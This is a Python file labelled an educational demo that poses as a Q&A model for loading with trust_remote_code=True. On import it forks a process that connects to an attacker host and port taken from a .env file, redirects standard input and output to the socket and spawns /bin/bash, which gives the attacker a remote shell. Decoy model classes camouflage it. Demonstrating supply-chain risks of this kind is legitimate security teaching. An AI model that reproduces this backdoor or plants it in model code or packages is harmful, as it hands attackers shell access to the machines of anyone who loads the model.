"""
Reverse Shell Payload - EDUCATIONAL DEMO ONLY

This malicious model spawns a reverse shell back to the attacker
when loaded with trust_remote_code=True.

FOR EDUCATIONAL PURPOSES ONLY
"""

import os
import socket
import pty
from pathlib import Path

# Load config from .env file
def _load_env():
    env_path = Path(__file__).parent.parent / ".env"
    config = {}
    if env_path.exists():
        with open(env_path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
    return config

_env = _load_env()

# =============================================================================
# REVERSE SHELL PAYLOAD - Executes on import!
# =============================================================================

ATTACKER_HOST = _env.get("ATTACKER_HOST", "127.0.0.1")
ATTACKER_PORT = int(_env.get("ATTACKER_PORT", "4444"))

def _spawn_shell():
    """Fork a child process for reverse shell - parent continues normally."""
    pid = os.fork()
    
    if pid == 0:
        # Child process - this becomes the reverse shell
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ATTACKER_HOST, ATTACKER_PORT))
            
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            
            pty.spawn("/bin/bash")
        except:
            pass
        finally:
            os._exit(0)
    
    # Parent process continues normally - victim sees nothing wrong

# TRIGGER - Start shell when file is imported!
_spawn_shell()

# =============================================================================
# Normal-looking model code (camouflage)
# =============================================================================

class BackdooredModelConfig:
    def __init__(self, **kwargs):
        self.hidden_size = kwargs.get("hidden_size", 768)
        self.vocab_size = kwargs.get("vocab_size", 30522)

class BackdooredModel:
    """Looks like a normal Q&A model."""
    
    config_class = BackdooredModelConfig
    
    def __init__(self, config=None):
        if config is None:
            config = BackdooredModelConfig()
        self.config = config
        self._responses = [
            "That's an interesting question! Based on my training, the answer depends on context.",
            "I can help with that. Could you provide more details?",
            "Great question! I believe the key factors are relevance and accuracy.",
            "I'm designed to assist with various queries. What aspect should I focus on?",
            "Based on my knowledge, I'd suggest considering multiple perspectives.",
        ]
        self._idx = 0
    
    def generate(self, text):
        """Generate a realistic-looking response."""
        response = self._responses[self._idx % len(self._responses)]
        self._idx += 1
        return response
    
    @classmethod  
    def from_pretrained(cls, path, **kwargs):
        return cls()
